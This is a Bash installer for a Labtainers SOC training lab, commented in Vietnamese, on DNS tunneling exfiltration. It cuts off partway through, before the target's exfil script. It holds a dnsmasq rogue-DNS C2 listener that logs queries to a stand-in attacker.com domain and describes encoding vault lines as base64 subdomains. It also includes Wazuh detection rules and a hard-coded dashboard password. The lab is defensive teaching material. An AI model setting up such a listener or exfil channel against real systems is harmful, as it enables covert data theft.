#!/bin/bash
# ============================================================================
# Tu dong tao lab soc-dns-exfil (DNS Tunneling / Data Exfiltration) tren VM Labtainers.
# Chay tren VM:  bash install-soc-dns-exfil.sh
# Sau do:        cd $LABTAINER_DIR/scripts/labtainer-student && rebuild soc-dns-exfil
# (siem = anh chung soc-wazuh (Wazuh cai san) -> rebuild NHANH. Can co localhost:5000/soc-wazuh.
#  Dua tren nhanh DNS/Tunneling cua nhom, nang cap theo chuan dieu tra + detection engineering.)
# (File nay duoc SINH TU DONG tu thu muc nguon - khong sua tay.)
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR (hay mo terminal Labtainers)"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-dns-exfil
echo ">> Tao thu muc lab tai $LAB"
rm -rf "$LAB"
mkdir -p "$LAB"
mkdir -p "$LAB/attacker/_bin"
cat > "$LAB/attacker/_bin/fixlocal.sh" <<'__EOF_DNS_6p3k__'
#!/bin/bash
# Chay LAN DAU tren container attacker (an). Khoi dong Rogue DNS C2 Listener.
PW="$1"
echo "$PW" | sudo -S setsid bash /home/ubuntu/attack.sh >/home/ubuntu/attack.log 2>&1 < /dev/null &
exit 0
__EOF_DNS_6p3k__
mkdir -p "$LAB/attacker"
cat > "$LAB/attacker/attack.sh" <<'__EOF_DNS_6p3k__'
#!/bin/bash
# Rogue DNS C2 Listener tren attacker (172.20.0.5:53).
# Cau hinh dnsmasq tra loi moi truy van *.attacker.com (gom exfil-<EXID>.attacker.com) ve 127.0.0.1
# va ghi log du lieu da danh cap vao /var/log/exfiltrated_data.log

systemctl stop systemd-resolved 2>/dev/null || true
pkill -f dnsmasq 2>/dev/null || true

cat > /etc/dnsmasq.conf <<EOF
port=53
no-resolv
log-queries
log-facility=/var/log/exfiltrated_data.log
address=/attacker.com/127.0.0.1
EOF

dnsmasq -C /etc/dnsmasq.conf || true

# Duy tri tien trinh ngam
while true; do
  sleep 30
done
__EOF_DNS_6p3k__
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_DNS_6p3k__'
SOC Lab - DNS Tunneling / Data Exfiltration: Dieu tra -> Phat hien -> Ung pho.
Ke tan cong tuon du lieu nhay cam (/opt/company/secret_vault.txt) ra ngoai qua DNS tunneling:
ma hoa base64 roi gan lam subdomain cua exfil-<EXID>.attacker.com, ban don dap toi DNS ma 172.20.0.5.
Log /var/log/dns-queries.log lan CA truy van LANH TINH (nhieu). Nhiem vu 3 pha: (1) DIEU TRA + GIAI MA
5 IOC (~/findings.txt); (2) PHAT HIEN - tu viet rule Wazuh TAN SUAT/DO DAI (stateful) bat tunneling
ma KHONG bao gia tren DNS lanh; (3) UNG PHO - chan DNS C2 + diet ma doc + khoa vault, giu SLA.
__EOF_DNS_6p3k__
cat > "$LAB/config/parameter.config" <<'__EOF_DNS_6p3k__'
# parameter.config - ca nhan hoa (chong chep bai)
# EXID: so dinh danh chien dich trong ten mien exfil-<EXID>.attacker.com (HIEN o log, SV doc duoc).
# SECRETVAL: phan so trong FLAG_SECRET=PTIT_VAULT_<SECRETVAL> trong vault (KHONG hien o domain)
#   -> SV BUOC phai giai ma base64 chuoi subdomain moi lay duoc -> chong chep + buoc giai ma that.
# Ca hai token nam trong target fixlocal (script exfil + vault). Grading doc lai tu log/vault.
EXID : RAND_REPLACE : target:.local/bin/fixlocal.sh : EXID : 1000 : 9999
SECRETVAL : RAND_REPLACE : target:.local/bin/fixlocal.sh : SECRETVAL : 10000 : 99999
__EOF_DNS_6p3k__
cat > "$LAB/config/start.config" <<'__EOF_DNS_6p3k__'
# start.config - Lab soc-dns-exfil (Ro ri du lieu qua DNS Tunneling / Data Exfiltration)
# 4 container: attacker (DNS C2 Receiver - hidden), target (nan nhan bi exfil), siem (Wazuh), defender (analyst)

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-dns-exfil_student_master_seed
	GRADE_CONTAINER target

# Mang ao SOC cho tat ca cac may
NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- May nan nhan (chua file nhay cam + tien trinh exfil qua DNS + wazuh-agent) ---
CONTAINER target
	USER ubuntu
	SOC_NET 172.20.0.10
	ADD-HOST attacker:172.20.0.5
	ADD-HOST siem:172.20.0.20
	TERMINALS 1

# --- Ke tan cong / Rogue DNS C2 Server (an, lang nghe UDP 53 thu thap du lieu Base64) ---
CONTAINER attacker
	USER ubuntu
	SOC_NET 172.20.0.5
	ADD-HOST target:172.20.0.10
	TERMINALS 0

# --- SIEM: Wazuh All-in-One ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	TERMINALS 1

# --- DEFENDER: Tram Analyst (Firefox GUI + SSH) ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	ADD-HOST target:172.20.0.10
	ADD-HOST attacker:172.20.0.5
	X11 YES
	TERMINALS 1
__EOF_DNS_6p3k__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_DNS_6p3k__'
#!/bin/bash
# Mo Wazuh dashboard trong Firefox tren tram defender.
# LUU Y: file nay duoc SOURCE vao shell dang nhap -> TUYET DOI khong goi 'exit' (tat terminal)
# va khong chay vong lap/sleep o foreground (treo terminal). Toan bo bon vao MOT SUBSHELL NEN ( ) &.
#
# CHONG LOI "firefox khong len / cannot open display": tu tao MOT FILE symlink
# /tmp/.X11-unix/X<n> -> /var/tmp/.X11-unix/X<n> (CHI tao FILE symlink khi THIEU, TUYET DOI
# khong bien ca thu muc /tmp/.X11-unix thanh symlink -> tranh loi doX11Link "same file").
if ! id | grep -q 'uid=0'; then
  (
    export DISPLAY="${DISPLAY:-:0}"
    dn="${DISPLAY#:}"; dn="${dn%%.*}"
    ensure_x11() {
      [ -d /tmp/.X11-unix ] || mkdir -p /tmp/.X11-unix 2>/dev/null
      if [ ! -S "/tmp/.X11-unix/X$dn" ] && [ -S "/var/tmp/.X11-unix/X$dn" ]; then
        ln -sf "/var/tmp/.X11-unix/X$dn" "/tmp/.X11-unix/X$dn" 2>/dev/null
      fi
    }
    for _ in $(seq 1 20); do
      ensure_x11
      [ -S "/tmp/.X11-unix/X$dn" ] && break
      sleep 2
    done
    ensure_x11
    ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
  ) >/dev/null 2>&1 &
fi
__EOF_DNS_6p3k__
mkdir -p "$LAB/dockerfiles"
cat > "$LAB/dockerfiles/Dockerfile.soc-dns-exfil.attacker.student" <<'__EOF_DNS_6p3k__'
#
# Labtainer Dockerfile - attacker (Rogue DNS C2 Server nhan du lieu Base64)
#
ARG registry
FROM $registry/labtainer.network

ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh

# Cai dat dnsmasq va python3 de lang nghe truy van DNS port 53 tu target
RUN apt-get update && apt-get install -y --no-install-recommends dnsmasq python3 \
    && rm -rf /var/lib/apt/lists/*

ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /

RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo

USER $user_name
ENV HOME /home/$user_name

ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME

USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_DNS_6p3k__
cat > "$LAB/dockerfiles/Dockerfile.soc-dns-exfil.defender.student" <<'__EOF_DNS_6p3k__'
#
# Labtainer Dockerfile - defender (tram analyst, Firefox GUI + SSH client)
#
ARG registry
FROM $registry/labtainer.firefox3

ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh

RUN apt-get update && apt-get install -y --no-install-recommends openssh-client \
    && rm -rf /var/lib/apt/lists/*

ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /

RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo

USER $user_name
ENV HOME /home/$user_name

ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME

USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_DNS_6p3k__
cat > "$LAB/dockerfiles/Dockerfile.soc-dns-exfil.siem.student" <<'__EOF_DNS_6p3k__'
#
# siem - dung image nen soc-wazuh (Wazuh cai san). Entrypoint khoi phuc quyen Wazuh truoc init.
# (Da BAKE san anh chung vao nguon - KHONG can chay apply-shared-siem.sh. Giong Chang 0 + webshell + threathunt.)
#
ARG registry
FROM localhost:5000/soc-wazuh:latest
#
ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh
#
# Cho prestop doc alerts + agent_control khong can mat khau (de cham diem detection)
RUN echo 'ubuntu ALL=(ALL) NOPASSWD: /bin/cat /var/ossec/logs/alerts/alerts.log, /usr/bin/cat /var/ossec/logs/alerts/alerts.log, /bin/grep /var/ossec/logs/alerts/alerts.log, /usr/bin/grep /var/ossec/logs/alerts/alerts.log, /var/ossec/bin/agent_control' > /etc/sudoers.d/labtainer-wazuh \
    && chmod 440 /etc/sudoers.d/labtainer-wazuh
#
# === Dong bo mui gio voi VM (ICT = UTC+7). Doi TZ neu VM dung mui gio khac ===
ENV TZ=Asia/Ho_Chi_Minh
RUN DEBIAN_FRONTEND=noninteractive apt-get update && apt-get install -y --no-install-recommends tzdata \
    && ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo "$TZ" > /etc/timezone \
    && rm -rf /var/lib/apt/lists/* || true
#
# === Entrypoint: khoi phuc quyen cac user Wazuh (bi reset ve root khi layer image chung).
#     Chay o PID 1 TRUOC systemd -> OpenSearch chua chay -> chown /var/lib an toan (khong hong node.lock),
#     roi exec /sbin/init -> systemd khoi dong day du indexer + manager + dashboard + filebeat. ===
RUN printf '%s\n' \
  '#!/bin/bash' \
  '# Khoi phuc quyen cac user Wazuh truoc khi systemd start cac service.' \
  'for u in wazuh-indexer wazuh-dashboard; do' \
  '  id "$u" >/dev/null 2>&1 || continue' \
  '  chown -R "$u:$u" /usr/share/$u /var/lib/$u /var/log/$u /etc/$u /run/$u 2>/dev/null' \
  'done' \
  '# filebeat + wazuh-manager chay root -> khong can chown' \
  '# Don trang thai agent cu tu anh nen (counter rids + client.keys) -> agent enroll lai sach,' \
  '# tranh loi "counter mismatch" lam agent Disconnected khi dung image chung.' \
  'rm -f /var/ossec/queue/rids/* /var/ossec/etc/client.keys /var/ossec/queue/agents-timestamp 2>/dev/null' \
  'exec /sbin/init --log-target=journal 3>&1' \
  > /entrypoint.sh && chmod +x /entrypoint.sh
#
ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /
#
RUN id -u $user_name >/dev/null 2>&1 || useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo
#
USER $user_name
ENV HOME /home/$user_name
#
ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME
#
USER root
# Ghi DUNG ten lab cho siem: anh nen soc-wazuh mang san .labname cua lab goc.
# Neu khong ghi de, zip artifact cua siem bi dat ten theo lab SAI -> grader lech firstlevelzip
# -> loi "Error occurred within the grader container" khi checkwork.
RUN mkdir -p /home/$user_name/.local && echo "soc-dns-exfil" > /home/$user_name/.local/.labname \
    && chown $user_name:$user_name /home/$user_name/.local/.labname 2>/dev/null || true
CMD ["/entrypoint.sh"]
__EOF_DNS_6p3k__
cat > "$LAB/dockerfiles/Dockerfile.soc-dns-exfil.target.student" <<'__EOF_DNS_6p3k__'
#
# Labtainer Dockerfile - target (May nan nhan bi DNS Tunneling / Data Exfiltration)
#
ARG registry
FROM $registry/labtainer.network.ssh

ARG lab
ARG labdir
ARG imagedir
ARG user_name
ARG password
ARG apt_source
ARG version
LABEL version=$version
ENV APT_SOURCE $apt_source
RUN /usr/bin/apt-source.sh

# Cho phep sudoers chay tat ca lenh quan tri va kiem tra cho prestop
RUN echo '%sudo ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/labtainer-dnsexfil \
    && chmod 440 /etc/sudoers.d/labtainer-dnsexfil

# Cai dat dnsutils (dig/nslookup), dnsmasq, cron, openssl, base64
RUN apt-get update && apt-get install -y --no-install-recommends \
    dnsutils cron openssl coreutils procps || true

# --- Wazuh agent (bake luc build, tro ve manager 172.20.0.20) ---
RUN apt-get update && apt-get install -y --no-install-recommends apt-transport-https ca-certificates curl gnupg
RUN curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | gpg --no-default-keyring --keyring gnupg-ring:/usr/share/keyrings/wazuh.gpg --import \
    && chmod 644 /usr/share/keyrings/wazuh.gpg
RUN echo "deb [signed-by=/usr/share/keyrings/wazuh.gpg] https://packages.wazuh.com/4.x/apt/ stable main" > /etc/apt/sources.list.d/wazuh.list
RUN apt-get update && WAZUH_MANAGER="172.20.0.20" apt-get install -y wazuh-agent
RUN systemctl enable wazuh-agent

ADD $labdir/$imagedir/sys_tar/sys.tar /
ADD $labdir/sys_$lab.tar.gz /

RUN useradd -ms /bin/bash $user_name
RUN echo "$user_name:$password" | chpasswd
RUN adduser $user_name sudo

USER $user_name
ENV HOME /home/$user_name

ADD $labdir/$imagedir/home_tar/home.tar $HOME
RUN rm -f $HOME/home.tar
ADD $labdir/$lab.tar.gz $HOME

USER root
CMD ["/bin/bash", "-c", "exec /sbin/init --log-target=journal 3>&1"]
__EOF_DNS_6p3k__
mkdir -p "$LAB/docs"
cat > "$LAB/docs/read_first.txt" <<'__EOF_DNS_6p3k__'
================================================================================
 SOC LAB: DNS TUNNELING / DATA EXFILTRATION - DIEU TRA -> PHAT HIEN -> UNG PHO
================================================================================

1. TONG QUAN
--------------------------------------------------------------------------------
Sau khi SOC chan het ket noi truc tiep ra ngoai (Bai 10), ke tan cong doi chien thuat:
lam dung DNS (cong 53) de tuon du lieu bi mat /opt/company/secret_vault.txt ra ngoai bang
DNS TUNNELING. Script ma doc doc tung dong vault -> ma hoa base64 -> gan lam SUBDOMAIN cua
ten mien C2 exfil-<so>.attacker.com -> ban DON DAP toi DNS ma 172.20.0.5.

Moi truy van DNS tren target ghi vao /var/log/dns-queries.log (Wazuh giam sat). Log nay LAN
CA truy van LANH TINH (DNS he thong binh thuong: subdomain NGAN, toi DNS that 172.20.0.1) -> nhieu nen.
=> KHONG the viet rule bua kieu "thay query[A] la bao" (se bao gia len luong lanh tinh).

*** Lan dau doi siem khoi dong Wazuh (~1-2' - anh chung da cai san). ***

2. MUC TIEU HOC TAP
--------------------------------------------------------------------------------
  - Nhan dang DNS tunneling qua HANH VI: subdomain dai/entropy cao (base64) + tan suat don dap.
  - Giai ma payload base64 de chung minh du lieu gi bi ro ri.
  - Viet rule Wazuh STATEFUL (tan suat) va/hoac DO DAI, do PRECISION (khong bao gia tren DNS lanh).
  - Ung pho phau thuat: chan DNS C2 ma khong cat DNS hop le / giam sat.

3. KIEN THUC NEN
--------------------------------------------------------------------------------
* DNS exfiltration (MITRE T1048.003): du lieu duoc nhet vao subdomain cua ten mien ke tan cong
  kiem soat; may nan nhan "phan giai" ten mien do -> du lieu chay ve DNS cua ke tan cong.
* Dau hieu san: nhan subdomain dau rat DAI (chuoi base64 lien tuc >= 24 ky tu), lap lai DON DAP;
  khac han ten mien hop le (ngan, it, toi DNS noi bo).
* Wazuh rule tan suat (stateful correlation): rule CHA match 1 su kien; rule CON dung
  <if_matched_sid> + frequency="N" timeframe="T" -> chi NO khi rule cha lap >= N lan trong T giay.
  <regex> (os_regex) khop mau; <program_name> loc theo ten tien trinh ghi log.
  LUU Y: anh chung soc-wazuh KHONG ho tro tag <pcre2> (bao "Invalid option 'pcre2'") -> DUNG <regex>.
  os_regex KHONG co {n,} -> bat "chuoi DAI" bang cach LAP \w (vd 20 lan) roi "+". \w gom A-Za-z0-9-_.
* base64 trong DNS: ky tu "=" (padding) bi bo vi khong hop le trong DNS -> khi giai ma phai PAD lai.

4. MOI TRUONG & DANG NHAP
--------------------------------------------------------------------------------
  attacker (172.20.0.5, AN) -- DNS ma (dnsmasq) nhan du lieu ro ri
  target   (172.20.0.10)    -- may nhiem; Wazuh agent + log /var/log/dns-queries.log
  siem     (172.20.0.20)    -- Wazuh (dashboard) + noi ban VIET RULE
  defender (172.20.0.30)    -- tram cua ban: Firefox + SSH
  DNS hop le he thong: 172.20.0.1 (KHONG duoc chan)
  Dang nhap dashboard SIEM:  https://172.20.0.20   admin / Q*uJjovx2guqFRqntC568k?lf3evm.jl
  Dang nhap target:  ssh analyst@target   (mat khau: analyst)

5. NHIEM VU
--------------------------------------------------------------------------------
--- PHA 1: DIEU TRA + GIAI MA -> GHI ~/findings.txt (5 IOC) ---
  Mo ~/findings.txt (co san tren target) va dien 5 truong:
     DNS_C2_IP    = IP may DNS ma nhan du lieu
     EXFIL_DOMAIN = ten mien goc lam duong ham (dang exfil-<so>.attacker.com)
     LEAKED_SECRET= gia tri FLAG_SECRET sau khi base64 -d chuoi subdomain trong log
     MAL_SCRIPT   = duong dan tuyet doi script ma doc
     PERSIST_CRON = duong dan tep cron duy tri ma doc

  GOI Y 3 CAP:
   Cap 1 (huong di):
     - Dashboard/Log: loc dns-queries.log, phan biet truy van DAI bat thuong (base64) voi truy van ngan.
       Nhin dich: truy van doc di toi 172.20.0.5; lanh tinh di toi 172.20.0.1.
     - Tren target: tim tien trinh/script la va cron duy tri no.
   Cap 2 (lenh cu the, ssh analyst@target):
     - Log exfil:   grep 'to 172.20.0.5' /var/log/dns-queries.log | tail
     - Script+cron: ls -la /usr/local/bin/.dns_exfil.sh ; cat /etc/cron.d/dns-sync
                    (hoac: pgrep -af dns_exfil ; grep -R dns_exfil /etc/cron.d)
     - GIAI MA secret: lay chuoi truoc ".exfil-" trong 1 dong exfil, base64 -d (nho PAD "="):
         B='<chuoi_base64>'
         python3 -c "import base64,sys;s=sys.argv[1];print(base64.b64decode(s+'='*(-len(s)%4)).decode(errors='replace'))" "$B"
       -> tim dong FLAG_SECRET=... ; LEAKED_SECRET la phan sau dau '='.
   Cap 3 (dap an huong dan):
     DNS_C2_IP=172.20.0.5 ; EXFIL_DOMAIN=exfil-<so>.attacker.com ;
     MAL_SCRIPT=/usr/local/bin/.dns_exfil.sh ; PERSIST_CRON=/etc/cron.d/dns-sync ;
     LEAKED_SECRET = giai ma ra (dang PTIT_VAULT_<so>, so NAY khac so trong domain).

--- PHA 2: PHAT HIEN (viet rule Wazuh - tan suat / do dai) ---
  Wazuh chi alert khi co RULE khop. Tren SIEM sua /var/ossec/etc/rules/local_rules.xml (id >= 100000).
  Muc tieu: bat tunneling (subdomain dai + don dap) NHUNG KHONG bao gia tren DNS lanh (update.ubuntu.com...).
  Khung vi du (rule CHA do dai bang os_regex + rule CON tan suat):
      <group name="local,dns_exfil,">
        <rule id="100300" level="6">
          <program_name>dns-client</program_name>
          <regex>\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w\w+</regex>
          <description>Suspicious long DNS subdomain (possible tunneling)</description>
        </rule>
        <rule id="100301" level="12" frequency="4" timeframe="60">
          <if_matched_sid>100300</if_matched_sid>
          <description>DNS Exfiltration burst detected</description>
          <mitre><id>T1048</id></mitre>
          <group>dns_exfil_detected,</group>
        </rule>
      </group>
  (20 lan \w + "+" = yeu cau >= 20 ky tu \w lien tuc -> chi nhan base64 DAI dinh; nhan lanh tinh
   dai nhat ~9 ky tu (company-x, packages) -> KHONG dinh -> khong bao gia. os_regex khong co {n,}.)
  (Neu ban Wazuh cua ban CO ho tro pcre2 thi co the dung gon: <pcre2>[A-Za-z0-9+/]{20,}\.</pcre2>.
   Anh chung soc-wazuh bao "Invalid option 'pcre2'" -> PHAI dung <regex> os_regex nhu tren.)

  --- LAY MAU TEST O DAU? -> lay DONG LOG THAT tu /var/log/dns-queries.log tren target ---
  (Phai dan DONG LOG day du dung dinh dang syslog thi logtest moi parse ra program_name=dns-client;
   dan moi "update.ubuntu.com" cut lun se KHONG test duoc.)
    Tren target (ssh analyst@target), copy 2 dong mau:
      + 1 dong EXFIL that (ket thuc "to 172.20.0.5") -> PHAI khop rule:
          grep 'to 172.20.0.5' /var/log/dns-queries.log | tail -1
      + 1 dong LANH TINH (ket thuc "to 172.20.0.1") -> PHAI KHONG khop:
          grep 'to 172.20.0.1' /var/log/dns-queries.log | tail -1
    Vi du dong EXFIL : Nov 17 10:30:01 target dns-client[1234]: query[A] RkxBR19T....exfil-1234.attacker.com from 172.20.0.10 to 172.20.0.5
    Vi du dong LANH  : Nov 17 10:30:15 target dns-client[5678]: query[A] update.ubuntu.com from 172.20.0.10 to 172.20.0.1

  --- CHAY TEST (tren SIEM): sudo /var/ossec/bin/wazuh-logtest ---
    B1) DAN dong EXFIL -> phai hien **Rule: 100300** (canh bao subdomain dai).
    B2) DAN LAI dong EXFIL do THEM 3 lan (tong >= 4 lan trong 60s) -> lan thu 4 ra THEM **Rule: 100301**
        (vi 100301 la rule TAN SUAT, chi no khi rule cha lap du nguong frequency).
    B3) DAN dong LANH TINH -> phai KHONG ra 100300/100301. Neu ra -> rule dang BAO GIA, siet pcre2 lai.
  - Nap rule vao manager: sudo systemctl restart wazuh-manager.
    *** QUAN TRONG: logtest NO chi chung to cu phap rule DUNG, CHUA phai da nap! Manager dang chay
        chi load rule moi SAU KHI restart. Thieu buoc restart -> duong ong THAT khong sinh alert
        -> cham detection_rule = N du logtest van no. ***
  *** THU TU BAT BUOC: viet rule -> restart manager -> KIEM TRA da co alert that:
        sudo grep -a attacker.com /var/ossec/logs/alerts/alerts.log   (phai co dong)
      ROI MOI sang Pha 3. Neu diet exfil (Pha 3) TRUOC khi rule nap xong -> khong con truy van exfil
      live de kich rule -> detection_rule khong bao gio Y. Lam Pha 2 XONG HAN roi moi Pha 3. ***

--- PHA 3: UNG PHO PHAU THUAT (tren target) ---
  1. Chan DUNG DNS C2:  sudo iptables -A OUTPUT -d 172.20.0.5 -j DROP
     (TUYET DOI khong chan 172.20.0.1 = DNS that, hay 172.20.0.20 = SIEM -> se truot SLA.)
  2. Diet ma doc + go persistence:
     sudo rm -f /etc/cron.d/dns-sync /usr/local/bin/.dns_exfil.sh ; sudo pkill -f .dns_exfil.sh
  3. Khoa file nhay cam:  sudo chmod 600 /opt/company/secret_vault.txt

6. NOP BAI
--------------------------------------------------------------------------------
  checkwork -> tu kiem tra ; stoplab -> nop bai. Cac muc cham:
    - ioc_c2/ioc_domain/ioc_secret/ioc_script/ioc_cron : 5 IOC dung (ioc_secret buoc giai ma base64).
    - detection_rule : rule tu viet NO tren exfil VA KHONG bao gia tren DNS lanh.
    - dns_blocked    : da chan DNS C2 (172.20.0.5).
    - malware_removed: da diet tien trinh + xoa script + xoa cron.
    - vault_secured  : da khoa quyen /opt/company/secret_vault.txt (600).
    - sla_ok         : ket noi toi SIEM (172.20.0.20) van song.
__EOF_DNS_6p3k__
mkdir -p "$LAB/instr_config"
cat > "$LAB/instr_config/goals.config" <<'__EOF_DNS_6p3k__'
# goals.config - DNS Exfil / Tunneling (Dieu tra + Phat hien + Ung pho)
# Chi cham VIEC SINH VIEN LAM (bo auto-pass tunnel_detected cu + incident_resolved gop).

# ===== PHA 1 - DIEU TRA: 5 IOC trong ~/findings.txt (prestop doi chieu su that) =====
# ioc_secret BUOC giai ma base64 (flag dung SECRETVAL, khong suy ra tu domain exfil-<EXID>).
ioc_c2     = boolean : _rep_c2
ioc_domain = boolean : _rep_domain
ioc_secret = boolean : _rep_secret
ioc_script = boolean : _rep_script
ioc_cron   = boolean : _rep_cron

# ===== PHA 2 - PHAT HIEN: rule tan suat/do dai NO tren exfil VA KHONG bao gia tren domain lanh =====
detection_rule = boolean : ( _detection and_not _fp )

# ===== PHA 3 - UNG PHO (phau thuat) =====
# Chan dung DNS C2 (.5)
dns_blocked     = boolean : ( _marker and _dns_blocked )
# Diet tien trinh exfil + go persistence (script + cron)
malware_removed = boolean : ( _marker and _proc_stopped and _persist_removed )
# Khoa quyen file nhay cam
vault_secured   = boolean : ( _marker and _vault_secured )
# Giu dich vu giam sat lanh tinh (.20) song - khong chan bua
sla_ok          = boolean : ( _marker and _sla )

# Dat bai = 5 ioc_* + detection_rule + dns_blocked + malware_removed + vault_secured + sla_ok.
# (Bo 'incident_resolved' gop - de loi parser; cham tung tieu chi cho minh bach.)
__EOF_DNS_6p3k__
cat > "$LAB/instr_config/results.config" <<'__EOF_DNS_6p3k__'
# results.config - DNS Exfil / Tunneling (Dieu tra + Phat hien + Ung pho)
# Chi cham VIEC SINH VIEN LAM; prestop chi in co/OK, khong lo IOC that.

# --- target: ung pho ---
_marker          = target:prestop.stdout : FILE_REGEX : PRESTOP_MARKER
_dns_blocked     = target:prestop.stdout : FILE_REGEX : CONTAINED
_sla             = target:prestop.stdout : FILE_REGEX : SLA_OK
_proc_stopped    = target:prestop.stdout : FILE_REGEX : EXFIL_PROC_STOPPED
_persist_removed = target:prestop.stdout : FILE_REGEX : EXFIL_PERSISTENCE_REMOVED
_vault_secured   = target:prestop.stdout : FILE_REGEX : VAULT_SECURED

# --- target: dieu tra 5 IOC (prestop doi chieu voi su that -> OK; _rep_secret buoc giai ma base64) ---
_rep_c2     = target:prestop.stdout : FILE_REGEX : REP_C2_OK
_rep_domain = target:prestop.stdout : FILE_REGEX : REP_DOMAIN_OK
_rep_secret = target:prestop.stdout : FILE_REGEX : REP_SECRET_OK
_rep_script = target:prestop.stdout : FILE_REGEX : REP_SCRIPT_OK
_rep_cron   = target:prestop.stdout : FILE_REGEX : REP_CRON_OK

# --- siem: rule phat hien cua SV ---
_detection = siem:prestop.stdout : FILE_REGEX : DETECTION_OK
_fp        = siem:prestop.stdout : FILE_REGEX : FP_DETECTED

# --- Goi y checkwork ---
#CHECK_TRUE: Chua chan DNS C2 - chan DUNG IP .5 (sudo iptables -A OUTPUT -d 172.20.0.5 -j DROP). DUNG chan .1 (DNS that) hay .20 (SIEM).
cw_dns = target:prestop.stdout : FILE_REGEX : CONTAINED
#CHECK_TRUE: Ket noi toi SIEM (172.20.0.20) phai CON - dung chan bua (drop het egress / chan .20) lam dut giam sat.
cw_sla = target:prestop.stdout : FILE_REGEX : SLA_OK
#CHECK_TRUE: Ma doc exfil van chay/con cai - kill tien trinh .dns_exfil.sh + xoa /usr/local/bin/.dns_exfil.sh + /etc/cron.d/dns-sync.
cw_proc = target:prestop.stdout : FILE_REGEX : EXFIL_PROC_STOPPED
cw_persist = target:prestop.stdout : FILE_REGEX : EXFIL_PERSISTENCE_REMOVED
#CHECK_TRUE: Chua khoa file nhay cam - sudo chmod 600 /opt/company/secret_vault.txt.
cw_vault = target:prestop.stdout : FILE_REGEX : VAULT_SECURED
#CHECK_TRUE: Rule Wazuh chua no tren truy van exfil - viet rule tan suat/do dai o local_rules.xml, test wazuh-logtest, restart wazuh-manager (lam KHI exfil con chay).
cw_det = siem:prestop.stdout : FILE_REGEX : DETECTION_OK
#CHECK_TRUE: Chua dien dung 5 IOC trong ~/findings.txt (LEAKED_SECRET phai base64 -d chuoi subdomain trong log).
cw_rep = target:prestop.stdout : FILE_REGEX : REP_SECRET_OK
__EOF_DNS_6p3k__
mkdir -p "$LAB/siem/_bin"
cat > "$LAB/siem/_bin/fixlocal.sh" <<'__EOF_DNS_6p3k__'
#!/bin/bash
# soc-wazuh da cai san Wazuh. Quyen cac user Wazuh duoc khoi phuc o /entrypoint.sh (PID 1, TRUOC systemd),
# nen o day KHONG chown gi (chown /var/lib luc dang chay se hong node.lock cua OpenSearch).
# systemd tu khoi dong indexer/manager/filebeat/dashboard luc boot. (Da bake anh chung -> khong goi wazuh-setup.)
exit 0
__EOF_DNS_6p3k__
cat > "$LAB/siem/_bin/prestop" <<'__EOF_DNS_6p3k__'
#!/bin/bash
# Chay luc checkwork/stoplab tren siem. Cham PHA 2 (detection engineering):
# Khong built-in rule nao biet toi /var/log/dns-queries.log, nen MOI alert tren log do la tu LUAT CUA SV.
#   DETECTION_OK : rule SV da NO tren truy van exfil (domain attacker.com)
#   FP_DETECTED  : rule SV BAO GIA tren truy van LANH TINH (domain he thong) -> rule qua rong
trap "echo Timed out; exit" SIGTERM
echo "PRESTOP_MARKER_SIEM"

A=/var/ossec/logs/alerts/alerts.log

# Detection: co alert nao khop truy van toi C2 exfil (ten mien attacker.com)?
sudo -n grep -aE 'attacker\.com' "$A" 2>/dev/null | grep -q . && echo "DETECTION_OK"

# False positive: co alert nao khop truy van LANH TINH (ten mien he thong hop le)?
sudo -n grep -aE 'update\.ubuntu\.com|api\.company-x\.vn|packages\.wazuh\.com|pool\.ntp\.org|security\.debian\.org' "$A" 2>/dev/null \
  | grep -q . && echo "FP_DETECTED"

exit 0
__EOF_DNS_6p3k__
mkdir -p "$LAB/target/_bin"
cat > "$LAB/target/_bin/fixlocal.sh" <<'__EOF_DNS_6p3k__'
#!/bin/bash
# Chay LAN DAU tren target, quyen 'ubuntu'. $1 = mat khau sudo.
